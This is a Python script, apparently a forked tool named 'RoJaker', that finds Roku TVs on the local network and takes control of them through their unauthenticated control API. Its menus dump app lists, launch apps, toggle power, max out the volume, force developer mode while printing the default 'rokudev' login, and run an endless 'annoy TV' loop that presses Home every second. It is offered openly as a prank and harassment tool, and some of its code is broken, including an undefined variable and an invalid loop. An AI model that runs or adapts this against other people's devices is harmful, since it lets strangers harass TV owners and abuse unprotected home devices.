# Forked by @Noface1200

import importlib.util
import os, time, sys, socket, struct

i = 1
required_packages = ['roku', 'colorama', 'requests']

for package in required_packages:
    if importlib.util.find_spec(package) is None:
        os.system(f'pip install {package}')

from roku import Roku
import requests, random, colorama

os.system("clear")

print("Scanning For Devices... (timeout=10)")
roku_devices = Roku.discover(timeout=10)

print("0 | Manual Input IP")

for index, device in enumerate(roku_devices):
    print(f"{index+1} | {device}")

selected_option = input(f"select an index (0-{len(roku_devices)}):  ")

if selected_option == "0":
    selected_device = input("enter IP address: ")
else:
    selected_option = int(selected_option) - 1

    if selected_option < 0 or selected_option >= len(roku_devices):
        print("Invalid selection")
        time.sleep(1)
        exit()
    else:
        selected_device = roku_devices[selected_index].host

def main():
    border = "|---------------------------|"
    formatted_device = selected_device.center(len(border) - 12)
    os.system("clear")

    print(f"""         _______________

         | /~~~~~~~~\ ||||

         ||  annoy    |...|

         || dem tvs  |   |

         | \________/  O |

          _______________
    {border}
    | REMADE By: Noface1200     |
    | Original By: RE70-DECEMBER|
    {border}
    | Version:     2.00         |
    {border}
    | Target: {formatted_device}|
    {border}
    """)

    print("1. Get Info\n2. See Current Running App\n3. Dump Apps\n4. Remote\n5. Run An App\n6. Power off or on TV\n7. Volume Loop\n8. Other Things\nq. Exit\n")

    return input("Menu > ")

def enable_dev():
    keymap = ['Up', 'Up', 'Right', 'Left', 'Right', 'Left', 'Right', 'Left', 'Right', 'Left', 'Right', 'Left', 'Right']
    print("Enabling developer Menu!")
    roku = Roku(selected_device)
    roku.home()
    time.sleep(1)
    for direction in keymap:
        roku._post(f'/keypress/{direction}')

    print("Developed Mode enabled\nTv Will Restart")
    print(f"please wait 30 seconds, after go to http://{selected_device}:80")
    print("Login Set To\nUsername: rokudev\npassword: abcd")
    input("click enter to return to the menu!")
    main()



def other_menu():
    print("1. Enable Roku developer menu\n2. Check for roku developer menu\n3. annoy TV \n4.Back to rojaker Menu")
    other_menu_input = input("menu --> ")
    if other_menu_input == "1":
        dev_menu_check()
    elif other_menu_input == "2":
        dev_check()
    elif other_menu_input == "3":
        annoy_tv()
    elif other_menu_input == "4":
        main()


def annoy_tv_menu():
    print("1. Annoy Tv\n2. GoBack")
    annoy = input("Pick Your annoying Option --> ")
    if annoy == "1":
        annoy_tv()
    elif annoy == "2":
        other_menu()

def annoy_tv():
    roku = Roku(selected_device)
    while True:
        time.sleep(1)
        roku.home()


def open_app():
    roku = Roku(selected_device)
    apps = roku.apps
    app_ids = [app.id for app in apps]
    random_app_id = random.choice(app_ids)
    test = roku[random_app_id]
    print("Launched: "+random_app_id)
    test.launch()
    input("click enter to return to menu")
    other_menu()


def dev_check():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((selected_device,80))
    if result == 0:
        print("Developer Mode Detected!")
    else:
        print("No Developer Mode Detected! ")
        sock.close()
    other_menu()

def dev_menu_check():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((selected_device,80))
    if result == 0:
        print("Developer Mode Already Detected!")
        print("Goto Browser and type to access it")
        print("http://"+selected_device+":80")
        print("Dont know login\nUsername: rokudev\npassword: ????")
        input("click enter to return to menu")
        main()
    else:
        print("No Developer Mode Detected! ")
        sock.close()
        enable_dev()


def vol_up_menu():
    roku = Roku(selected_device)
    for i in 100:
        roku._post('/keypress/VolumeUp')

def vol_down_menu():
    roku = Roku(selected_device)
    for i in 100:
        roku._post('/keypress/VolumeDown')

def vol_menu():
    print("Turn The volume all the way up or down")
    print("1.Up\n2.Down")
    u = input("Volume > ")
    if u == "1":
        vol_up_menu()
    elif u == "2":
        vol_down_menu()

def remote_menu():
    os.system("clear")

    border = "|---------------------------|"

    formatted_device = selected_device.center(len(border) - 12)

    print(border)

    print(f"""{border}
    | REMADE By: Noface1200     |
    | Made By: RE70-DECEMBER    |
    | Version:        4         |
    | Target: {formatted_device} |"
    {border}""")

    print("1. Up\n2. Down\n3. Right\n4. Left\n5. Select\n6. Back\n7. Replay\n8. Home menu\n9. Return to RoJaker")
    rem = input("(Remote) --> ")

    if rem == "1":
      roku = Roku(selected_device)
      roku._post('/keypress/Up')
      remote_menu()
    elif rem == "2":
      roku = Roku(selected_device)
      roku._post('/keypress/Down')
      remote_menu()
    elif rem == "3":
      roku = Roku(selected_device)
      roku._post('/keypress/Right')
      remote_menu()
    elif rem == "4":
      roku = Roku(selected_device)
      roku._post('/keypress/Left')
      remote_menu()
    elif rem == "5":
      roku = Roku(selected_device)
      roku._post('/keypress/Select')
      remote_menu()
    elif rem == "6":
      roku = Roku(selected_device)
      roku._post('/keypress/Back')
      remote_menu()
    elif rem == "7":
      roku = Roku(selected_device)
      roku._post('/keypress/Replay')
      remote_menu()
    elif rem == "8":
      roku = Roku(selected_device)
      roku.home()
      remote_menu()
    elif rem == "9":
      main()

while True:
    menu = main()
    if menu == "1":
        roku = Roku(selected_device)
        colorama.init()
        print(roku.info)
        input("Press enter to return to menu")
    elif menu == "2":
        roku = Roku(selected_device)
        print(roku.active_app)
        time.sleep(1)
    elif menu == "3":
        roku = Roku(selected_device)
        print(roku.apps)
        time.sleep(5)
    elif menu == "4":
        remote_menu()

    elif menu == "5":
    	roku = Roku(selected_device)
    	user_run = input("Enter App ID: ")
    	test = roku[user_run]
    	test.launch()
    elif menu == "6":
    	roku = Roku(selected_device)
    	roku._post('/keypress/Power')
    	print("[*]TV Powered Off or On")
    	input("Press enter to return to menu")
    elif menu == "7":
        vol_menu()
    elif menu == "8":
        other_menu()
    elif menu == "c":
        os.system("python3 config.py")
    elif menu == "q":
    	exit()
